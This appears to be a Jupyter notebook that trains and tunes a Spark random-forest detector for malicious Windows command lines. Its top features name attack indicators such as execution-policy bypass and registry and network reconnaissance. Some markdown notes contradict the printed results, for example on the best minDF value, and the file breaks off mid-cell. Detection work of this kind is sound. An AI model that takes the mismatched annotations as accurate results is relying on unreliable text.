{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pyspark.conf import SparkConf\n",
    "from pyspark.sql import SparkSession\n",
    "import pyspark.sql.functions as F\n",
    "import pyspark.sql.types as T\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "import matplotlib.pyplot as plt\n",
    "from pyspark.ml import feature, evaluation, Pipeline\n",
    "from pyspark.ml.classification import RandomForestClassifier\n",
    "from pyspark.ml.evaluation import BinaryClassificationEvaluator\n",
    "from pyspark.ml.tuning import CrossValidator, ParamGridBuilder\n",
    "from functools import reduce\n",
    "from pyspark.sql import DataFrame\n",
    "from pyspark.sql import Row"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<pyspark.conf.SparkConf at 0x7f45b71bf5c0>"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "conf = (SparkConf()\n",
    "            .setAppName('random_forest')\n",
    "            .setMaster('spark://spark-master:7077')\n",
    "       )\n",
    "conf.set(\"spark.executor.memory\", \"6g\")\n",
    "conf.set(\"spark.driver.maxResultSize\", \"0\")\n",
    "conf.set(\"spark.sql.shuffle.partitions\", \"6\")\n",
    "conf.set(\"spark.default.parallelism\", \"6\")\n",
    "conf.set(\"spark.driver.memory\", \"3g\") "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "spark = SparkSession.builder.config(conf=conf).getOrCreate()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "# load original dataset without bootstrapped samples\n",
    "df = (spark.read.format('csv')\n",
    "      .option('inferSchema', 'true')\n",
    "      .option('header', 'true')\n",
    "      .option('escape', '\"')\n",
    "      .load('hdfs://namenode:9000/data/no_bootstrap.csv') \n",
    "     )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "52395"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.count()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Create command line tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "@F.udf(returnType=T.StringType())\n",
    "def clean_input2(s):\n",
    "    common_strings = ['windows', 'system32', 'cmd.exe', 'sandcat.exe', 'c', 'windowspowershell', 'v1.0', 'powershell.exe', '']\n",
    "\n",
    "    pattern = re.compile(r\"\"\"\n",
    "        [:|\"?']\n",
    "        | --field-trial-handle=.*\\d+\n",
    "        | //.*com(/.*)/\n",
    "        | \\s*\"\\s*\n",
    "        | \\{.*\\}\n",
    "        | [=;(),]\n",
    "        | \\\\\n",
    "        | //\n",
    "        | \\s+\\.\\s+ \n",
    "        | $.\n",
    "        | $_.\n",
    "        | (>>)\n",
    "    \"\"\", re.VERBOSE)\n",
    "    \n",
    "    return ','.join([x.lower() for x in re.sub(pattern, ' ', s).split() if x.lower() not in common_strings and len(x) >= 2])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pyspark.sql.functions import regexp_extract, regexp_replace, col, count, split, size, to_date\n",
    "\n",
    "def clean_input1(df):\n",
    "    _df = df.select(\n",
    "        '*'\n",
    "    ).withColumn(\n",
    "        'class_label', (col('class_label').cast('int'))\n",
    "    ).withColumn(\n",
    "        'cmd_line_tokens', split(clean_input2(col('command_line')), ',')\n",
    "    )\n",
    "    \n",
    "    return _df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = clean_input1(df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = df.filter(F.size('cmd_line_tokens') > 2)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Data engineering pipelines \n",
    "+ Term Frequency (one-hot): value indicates if feature is present in observation\n",
    "+ Feature has to be present at least once in dataset and in at least 50 documents"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "cv_transformer = feature.CountVectorizer(minTF=1, minDF=5, binary=True, inputCol='cmd_line_tokens', outputCol='tf')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "estimator = Pipeline(stages=[cv_transformer]).fit(df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+-----------------------------------------------------------------------------+------------------------------------------------------+\n",
      "|cmd_line_tokens                                                              |tf                                                    |\n",
      "+-----------------------------------------------------------------------------+------------------------------------------------------+\n",
      "|[svchost.exe, -k, localservicenetworkrestricted, -p, -s, lmhosts]            |(1519,[25,26,57,60,103,459],[1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[svchost.exe, -k, localservicenetworkrestricted, -p, -s, dhcp]               |(1519,[25,26,57,60,103,567],[1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[svchost.exe, -k, localservicenetworkrestricted, -p]                         |(1519,[25,26,57,103],[1.0,1.0,1.0,1.0])               |\n",
      "|[svchost.exe, -k, networkservice, -p, -s, dnscache]                          |(1519,[25,26,57,60,151,596],[1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[svchost.exe, -k, netsvcs, -p, -s, usermanager]                              |(1519,[25,26,57,60,74,550],[1.0,1.0,1.0,1.0,1.0,1.0]) |\n",
      "|[svchost.exe, -k, localservicenonetworkfirewall, -p]                         |(1519,[25,26,57,500],[1.0,1.0,1.0,1.0])               |\n",
      "|[svchost.exe, -k, localservice, -p, -s, sstpsvc]                             |(1519,[25,26,57,60,113,598],[1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[program, files, vmware, vmware, tools, vmware, vgauth, vgauthservice.exe]   |(1519,[2,3,137,203,509,513],[1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[svchost.exe, -k, netsvcs, -p, -s, iphlpsvc]                                 |(1519,[25,26,57,60,74,557],[1.0,1.0,1.0,1.0,1.0,1.0]) |\n",
      "|[wbem, wmiprvse.exe, -secured, -embedding]                                   |(1519,[97,166,182,266],[1.0,1.0,1.0,1.0])             |\n",
      "|[provtool.exe, /turn, /source, sysprephandler]                               |(1519,[700,713,721],[1.0,1.0,1.0])                    |\n",
      "|[svchost.exe, -k, netsvcs, -p, -s, dmwappushservice]                         |(1519,[25,26,57,60,74,611],[1.0,1.0,1.0,1.0,1.0,1.0]) |\n",
      "|[svchost.exe, -k, netsvcs, -p]                                               |(1519,[25,26,57,74],[1.0,1.0,1.0,1.0])                |\n",
      "|[svchost.exe, -k, netsvcs, -p]                                               |(1519,[25,26,57,74],[1.0,1.0,1.0,1.0])                |\n",
      "|[svchost.exe, -k, localsystemnetworkrestricted, -p, -s, audioendpointbuilder]|(1519,[25,26,57,60,107,572],[1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[svchost.exe, -k, localservicenetworkrestricted, -p, -s, lmhosts]            |(1519,[25,26,57,60,103,459],[1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[svchost.exe, -k, wsappx, -p, -s, clipsvc]                                   |(1519,[25,26,57,60,136,235],[1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[svchost.exe, -k, localsystemnetworkrestricted, -p, -s, ncbservice]          |(1519,[25,26,57,60,107,601],[1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[svchost.exe, -k, netsvcs, -p, -s, gpsvc]                                    |(1519,[25,26,57,60,74,186],[1.0,1.0,1.0,1.0,1.0,1.0]) |\n",
      "|[svchost.exe, -k, localservice, -p, -s, eventsystem]                         |(1519,[25,26,57,60,113,565],[1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "+-----------------------------------------------------------------------------+------------------------------------------------------+\n",
      "only showing top 20 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "estimator.transform(df).select('cmd_line_tokens','tf').sample(.2).show(20, False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1519"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(estimator.stages[0].vocabulary)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "training_df, validation_df, testing_df = df.randomSplit([0.6, 0.3, 0.1], seed=0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "rf = RandomForestClassifier(featuresCol='tf', labelCol='class_label', maxDepth=6, numTrees=100, \n",
    "                            featureSubsetStrategy='sqrt', impurity='gini', seed=0)\n",
    "rf_estimator = Pipeline(stages=[cv_transformer, rf])\n",
    "rf_model = rf_estimator.fit(training_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Row(accuracy=0.9789359391965256)"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "rf_model.transform(testing_df).\\\n",
    "    select(F.avg(F.expr('float(class_label = prediction)')).alias('accuracy')).\\\n",
    "    first()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DecisionTreeClassificationModel (uid=dtc_44a9b1babff9) of depth 6 with 13 nodes\n",
      "  If (feature 198 <= 0.5)\n",
      "   If (feature 332 <= 0.5)\n",
      "    If (feature 192 <= 0.5)\n",
      "     If (feature 334 <= 0.5)\n",
      "      If (feature 3 <= 0.5)\n",
      "       If (feature 884 <= 0.5)\n",
      "        Predict: 0.0\n",
      "       Else (feature 884 > 0.5)\n",
      "        Predict: 1.0\n",
      "      Else (feature 3 > 0.5)\n",
      "       Predict: 0.0\n",
      "     Else (feature 334 > 0.5)\n",
      "      Predict: 1.0\n",
      "    Else (feature 192 > 0.5)\n",
      "     Predict: 1.0\n",
      "   Else (feature 332 > 0.5)\n",
      "    Predict: 1.0\n",
      "  Else (feature 198 > 0.5)\n",
      "   Predict: 1.0\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(rf_model.stages[-1].trees[3].toDebugString)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Inference"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "+ The tokens with the most importance all indicate a malicious log and are very similar to the tokens identified in the LR model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>vocab</th>\n",
       "      <th>weight</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>102</th>\n",
       "      <td>-executionpolicy</td>\n",
       "      <td>0.107252</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>100</th>\n",
       "      <td>bypass</td>\n",
       "      <td>0.085936</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>97</th>\n",
       "      <td>-c</td>\n",
       "      <td>0.057613</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>158</th>\n",
       "      <td>/c</td>\n",
       "      <td>0.050603</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>171</th>\n",
       "      <td>select-object</td>\n",
       "      <td>0.039596</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>193</th>\n",
       "      <td>reg</td>\n",
       "      <td>0.036716</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>198</th>\n",
       "      <td>hklm</td>\n",
       "      <td>0.026495</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>206</th>\n",
       "      <td>-first</td>\n",
       "      <td>0.022687</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>192</th>\n",
       "      <td>select</td>\n",
       "      <td>0.021821</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>227</th>\n",
       "      <td>currentversion</td>\n",
       "      <td>0.021065</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>269</th>\n",
       "      <td>staged</td>\n",
       "      <td>0.020230</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>201</th>\n",
       "      <td>net</td>\n",
       "      <td>0.019469</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>204</th>\n",
       "      <td>-recurse</td>\n",
       "      <td>0.017701</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>174</th>\n",
       "      <td>foreach</td>\n",
       "      <td>0.017629</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>216</th>\n",
       "      <td>-force</td>\n",
       "      <td>0.017435</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>243</th>\n",
       "      <td>new-object</td>\n",
       "      <td>0.016618</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>246</th>\n",
       "      <td>share</td>\n",
       "      <td>0.016385</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>196</th>\n",
       "      <td>get-wmiobject</td>\n",
       "      <td>0.016231</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>181</th>\n",
       "      <td>-path</td>\n",
       "      <td>0.013203</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>230</th>\n",
       "      <td>-name</td>\n",
       "      <td>0.012580</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                vocab    weight\n",
       "102  -executionpolicy  0.107252\n",
       "100            bypass  0.085936\n",
       "97                 -c  0.057613\n",
       "158                /c  0.050603\n",
       "171     select-object  0.039596\n",
       "193               reg  0.036716\n",
       "198              hklm  0.026495\n",
       "206            -first  0.022687\n",
       "192            select  0.021821\n",
       "227    currentversion  0.021065\n",
       "269            staged  0.020230\n",
       "201               net  0.019469\n",
       "204          -recurse  0.017701\n",
       "174           foreach  0.017629\n",
       "216            -force  0.017435\n",
       "243        new-object  0.016618\n",
       "246             share  0.016385\n",
       "196     get-wmiobject  0.016231\n",
       "181             -path  0.013203\n",
       "230             -name  0.012580"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "vocab = rf_model.stages[0].vocabulary\n",
    "feature_importance = rf_model.stages[-1].featureImportances.toArray()\n",
    "vocab_importance_df = pd.DataFrame({'vocab': vocab, 'weight': feature_importance})\n",
    "vocab_importance_df.sort_values('weight', ascending=False).head(20)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Model Tuning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "paramGrid = (ParamGridBuilder() \n",
    "                 .addGrid(rf_model.stages[0].minDF, [3,5,10]) \n",
    "                 .addGrid(rf_model.stages[1].numTrees, [300,400,500,600,700\n",
    "                                                       \n",
    "                                                       ]) \n",
    "                 .addGrid(rf_model.stages[1].maxDepth, [10,15,20])\n",
    "                 .build()\n",
    "            )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Fitting model 0\n",
      "Fitting model 1\n",
      "Fitting model 2\n",
      "Fitting model 3\n",
      "Fitting model 4\n",
      "Fitting model 5\n",
      "Fitting model 6\n",
      "Fitting model 7\n",
      "Fitting model 8\n",
      "Fitting model 9\n",
      "Fitting model 10\n",
      "Fitting model 11\n",
      "Fitting model 12\n",
      "Fitting model 13\n",
      "Fitting model 14\n",
      "Fitting model 15\n",
      "Fitting model 16\n",
      "Fitting model 17\n",
      "Fitting model 18\n",
      "Fitting model 19\n",
      "Fitting model 20\n",
      "Fitting model 21\n",
      "Fitting model 22\n",
      "Fitting model 23\n",
      "Fitting model 24\n",
      "Fitting model 25\n",
      "Fitting model 26\n",
      "Fitting model 27\n",
      "Fitting model 28\n",
      "Fitting model 29\n",
      "Fitting model 30\n",
      "Fitting model 31\n",
      "Fitting model 32\n",
      "Fitting model 33\n",
      "Fitting model 34\n",
      "Fitting model 35\n",
      "Fitting model 36\n",
      "Fitting model 37\n",
      "Fitting model 38\n",
      "Fitting model 39\n",
      "Fitting model 40\n",
      "Fitting model 41\n",
      "Fitting model 42\n",
      "Fitting model 43\n",
      "Fitting model 44\n"
     ]
    }
   ],
   "source": [
    "models = []\n",
    "for grid in range(len(paramGrid)):\n",
    "    print(\"Fitting model {}\".format(grid))\n",
    "    _model = rf_estimator.fit(validation_df, paramGrid[grid])\n",
    "    models.append(_model)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "evaluator = BinaryClassificationEvaluator(labelCol='class_label', metricName='areaUnderROC')\n",
    "auc_scores = [evaluator.evaluate(model.transform(validation_df)) for model in models]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[0.9972198490538934,\n",
       " 0.9981039592638306,\n",
       " 0.9986022458572986,\n",
       " 0.9974207939319136,\n",
       " 0.9982271723783368,\n",
       " 0.998342116156299,\n",
       " 0.9976248102777932,\n",
       " 0.9984694639390772,\n",
       " 0.9985953941213049,\n",
       " 0.998326758817003,\n",
       " 0.9983564102951823,\n",
       " 0.9984852938118901,\n",
       " 0.997834497025874,\n",
       " 0.9981360915429731,\n",
       " 0.9986068530590875,\n",
       " 0.996158302508397,\n",
       " 0.9962404052069413,\n",
       " 0.9969754310923273,\n",
       " 0.9950993548972428,\n",
       " 0.9967163645917404,\n",
       " 0.9966433581633946,\n",
       " 0.996238987606391,\n",
       " 0.9966192589540376,\n",
       " 0.9968280006350849,\n",
       " 0.9962028387923556,\n",
       " 0.9970952183388367,\n",
       " 0.9972857674794873,\n",
       " 0.9957744871593741,\n",
       " 0.9968062640933122,\n",
       " 0.9971153010133008,\n",
       " 0.9911085730810886,\n",
       " 0.9947788590394716,\n",
       " 0.9959910256434489,\n",
       " 0.9923972901147878,\n",
       " 0.9958011853030735,\n",
       " 0.9956287105694408,\n",
       " 0.9927487369179097,\n",
       " 0.9945755514938674,\n",
       " 0.9957939791669423,\n",
       " 0.9925721275160047,\n",
       " 0.9948263486579103,\n",
       " 0.9953731880702298,\n",
       " 0.9923717733048805,\n",
       " 0.9956113449626982,\n",
       " 0.9956451311091497]"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "auc_scores"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best params: \n",
      "\n",
      "{Param(parent='CountVectorizer_a19d2d2525be', name='minDF', doc='Specifies the minimum number of different documents a term must appear in to be included in the vocabulary. If this is an integer >= 1, this specifies the number of documents the term must appear in; if this is a double in [0,1), then this specifies the fraction of documents. Default 1.0'): 3.0, Param(parent='RandomForestClassifier_40d9ba405786', name='numTrees', doc='Number of trees to train (>= 1)'): 700, Param(parent='RandomForestClassifier_40d9ba405786', name='maxDepth', doc='Maximum depth of the tree. (>= 0) E.g., depth 0 means 1 leaf node; depth 1 means 1 internal node + 2 leaf nodes.'): 20}\n",
      "\n",
      "Best Validation AUC: \n",
      "\n",
      "0.9986068530590875\n"
     ]
    }
   ],
   "source": [
    "best_model_idx = np.argmax(auc_scores)\n",
    "best_model = models[best_model_idx]\n",
    "print(\"Best params: \\n\\n{}\\n\".format(paramGrid[best_model_idx]))\n",
    "print(\"Best Validation AUC: \\n\\n{}\".format(auc_scores[best_model_idx]))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Best model\n",
    "+ minDF: 10\n",
    "+ numTrees: 700\n",
    "+ maxDepth: 20"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>token</th>\n",
       "      <th>importance</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>107</th>\n",
       "      <td>bypass</td>\n",
       "      <td>0.079016</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>108</th>\n",
       "      <td>-executionpolicy</td>\n",
       "      <td>0.074952</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>103</th>\n",
       "      <td>-c</td>\n",
       "      <td>0.060897</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>192</th>\n",
       "      <td>reg</td>\n",
       "      <td>0.034378</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>238</th>\n",
       "      <td>net</td>\n",
       "      <td>0.033503</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>198</th>\n",
       "      <td>hklm</td>\n",
       "      <td>0.028682</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>195</th>\n",
       "      <td>foreach</td>\n",
       "      <td>0.022863</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>224</th>\n",
       "      <td>currentversion</td>\n",
       "      <td>0.019843</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>185</th>\n",
       "      <td>-path</td>\n",
       "      <td>0.017188</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>344</th>\n",
       "      <td>delete</td>\n",
       "      <td>0.016475</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>222</th>\n",
       "      <td>-name</td>\n",
       "      <td>0.015847</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>178</th>\n",
       "      <td>select-object</td>\n",
       "      <td>0.014704</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>205</th>\n",
       "      <td>-force</td>\n",
       "      <td>0.013985</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>355</th>\n",
       "      <td>/i</td>\n",
       "      <td>0.013782</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>186</th>\n",
       "      <td>/c</td>\n",
       "      <td>0.013344</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>182</th>\n",
       "      <td>/s</td>\n",
       "      <td>0.013131</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>221</th>\n",
       "      <td>-recurse</td>\n",
       "      <td>0.012910</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>189</th>\n",
       "      <td>select</td>\n",
       "      <td>0.012403</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>277</th>\n",
       "      <td>new-object</td>\n",
       "      <td>0.011174</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>237</th>\n",
       "      <td>/r</td>\n",
       "      <td>0.010184</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                token  importance\n",
       "107            bypass    0.079016\n",
       "108  -executionpolicy    0.074952\n",
       "103                -c    0.060897\n",
       "192               reg    0.034378\n",
       "238               net    0.033503\n",
       "198              hklm    0.028682\n",
       "195           foreach    0.022863\n",
       "224    currentversion    0.019843\n",
       "185             -path    0.017188\n",
       "344            delete    0.016475\n",
       "222             -name    0.015847\n",
       "178     select-object    0.014704\n",
       "205            -force    0.013985\n",
       "355                /i    0.013782\n",
       "186                /c    0.013344\n",
       "182                /s    0.013131\n",
       "221          -recurse    0.012910\n",
       "189            select    0.012403\n",
       "277        new-object    0.011174\n",
       "237                /r    0.010184"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "vocab = best_model.stages[0].vocabulary\n",
    "feature_importance = best_model.stages[-1].featureImportances.toArray()\n",
    "best_vocab_importance_df = pd.DataFrame({'token': vocab, 'importance': feature_importance})\n",
    "best_vocab_importance_df.sort_values('importance', ascending=False).head(20)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DecisionTreeClassificationModel (uid=dtc_5d6fc8fe6361) of depth 20 with 49 nodes\n",
      "  If (feature 1 <= 0.5)\n",
      "   If (feature 265 <= 0.5)\n",
      "    If (feature 103 <= 0.5)\n",
      "     If (feature 677 <= 0.5)\n",
      "      If (feature 238 <= 0.5)\n",
      "       If (feature 336 <= 0.5)\n",
      "        If (feature 783 <= 0.5)\n",
      "         If (feature 251 <= 0.5)\n",
      "          If (feature 733 <= 0.5)\n",
      "           If (feature 531 <= 0.5)\n",
      "            If (feature 350 <= 0.5)\n",
      "             If (feature 535 <= 0.5)\n",
      "              If (feature 720 <= 0.5)\n",
      "               If (feature 996 <= 0.5)\n",
      "                If (feature 9 <= 0.5)\n",
      "                 If (feature 222 <= 0.5)\n",
      "                  If (feature 1070 <= 0.5)\n",
      "                   If (feature 705 <= 0.5)\n",
      "                    If (feature 343 <= 0.5)\n",
      "                     If (feature 788 <= 0.5)\n",
      "                      Predict: 0.0\n",
      "                     Else (feature 788 > 0.5)\n",
      "                      Predict: 1.0\n",
      "                    Else (feature 343 > 0.5)\n",
      "                     Predict: 1.0\n",
      "                   Else (feature 705 > 0.5)\n",
      "                    Predict: 1.0\n",
      "                  Else (feature 1070 > 0.5)\n",
      "                   Predict: 1.0\n",
      "                 Else (feature 222 > 0.5)\n",
      "                  Predict: 1.0\n",
      "                Else (feature 9 > 0.5)\n",
      "                 Predict: 0.0\n",
      "               Else (feature 996 > 0.5)\n",
      "                Predict: 1.0\n",
      "              Else (feature 720 > 0.5)\n",
      "               Predict: 1.0\n",
      "             Else (feature 535 > 0.5)\n",
      "              Predict: 1.0\n",
      "            Else (feature 350 > 0.5)\n",
      "             Predict: 1.0\n",
      "           Else (feature 531 > 0.5)\n",
      "            Predict: 1.0\n",
      "          Else (feature 733 > 0.5)\n",
      "           Predict: 1.0\n",
      "         Else (feature 251 > 0.5)\n",
      "          If (feature 332 <= 0.5)\n",
      "           If (feature 472 <= 0.5)\n",
      "            If (feature 829 <= 0.5)\n",
      "             Predict: 0.0\n",
      "            Else (feature 829 > 0.5)\n",
      "             Predict: 1.0\n",
      "           Else (feature 472 > 0.5)\n",
      "            Predict: 1.0\n",
      "          Else (feature 332 > 0.5)\n",
      "           Predict: 1.0\n",
      "        Else (feature 783 > 0.5)\n",
      "         Predict: 1.0\n",
      "       Else (feature 336 > 0.5)\n",
      "        Predict: 1.0\n",
      "      Else (feature 238 > 0.5)\n",
      "       Predict: 1.0\n",
      "     Else (feature 677 > 0.5)\n",
      "      Predict: 1.0\n",
      "    Else (feature 103 > 0.5)\n",
      "     If (feature 531 <= 0.5)\n",
      "      Predict: 1.0\n",
      "     Else (feature 531 > 0.5)\n",
      "      Predict: 0.0\n",
      "   Else (feature 265 > 0.5)\n",
      "    Predict: 1.0\n",
      "  Else (feature 1 > 0.5)\n",
      "   Predict: 0.0\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(best_model.stages[-1].trees[2].toDebugString)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Cross Validation\n",
    "+ test best_model performance on training dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.9985629287817379"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "evaluator.evaluate(best_model.transform(testing_df))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [],
   "source": [
    "best_model_df = best_model.transform(testing_df)\n",
    "tp = best_model_df.filter((best_model_df.class_label == 1) & (best_model_df.prediction == 1)).count()\n",
    "tn = best_model_df.filter((best_model_df.class_label == 0) & (best_model_df.prediction == 0)).count()\n",
    "fp = best_model_df.filter((best_model_df.class_label == 0) & (best_model_df.prediction == 1)).count()\n",
    "fn = best_model_df.filter((best_model_df.class_label == 1) & (best_model_df.prediction == 0)).count()\n",
    "recall = tp / (tp + fn)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
